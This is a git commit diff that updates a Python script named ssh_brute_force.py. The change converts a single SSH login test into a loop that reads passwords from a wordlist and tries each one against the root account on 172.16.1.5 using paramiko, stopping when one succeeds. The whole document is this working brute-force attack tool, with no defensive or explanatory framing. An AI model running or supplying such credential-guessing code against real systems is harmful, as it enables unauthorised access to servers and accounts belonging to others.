9d2577dc1a60a70cbd7445653421602b4e3ed463
Messias <110695778+Rhuan-Messias@users.noreply.github.com>
2024-04-05 15:43:09 -0300

    Update ssh_brute_force.py

--- ssh_brute_force.py
+++ ssh_brute_force.py
@@ -5,16 +5,20 @@ import paramiko
 ssh = paramiko.SSHClient()
 ssh.load_system_host_keys()
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Auto Add the key to the known_hosts file
-
-try:
-  ssh.connect("172.16.1.5", username='root', password='root')
-except paramiko.ssh_exception.AuthenticationException:
-  print("Access failed")
-else:
-  print("Connected")
-  stdin, stdout, stderr = ssh.exec_command('ls') #here you can type the commands you want to execute, this will bring the stdout in list format
-  for line in stdout.readlines():
-    print(line).strip() # strip() will remove the line breaks
+f = open("wordlist.txt")
+for word in f.readlines():
+  passwd = word.strip()
+  try:
+    ssh.connect("172.16.1.5", username='root', password=passwd)
+  except paramiko.ssh_exception.AuthenticationException:
+    print("Testing:",passwd)
+  else:
+    print("[+] Password Found --->", passwd)
+    break
+    
+    '''stdin, stdout, stderr = ssh.exec_command('ls') #here you can type the commands you want to execute, this will bring the stdout in list format
+    for line in stdout.readlines():
+      print(line).strip() # strip() will remove the line breaks'''
 
 
 ssh.close()
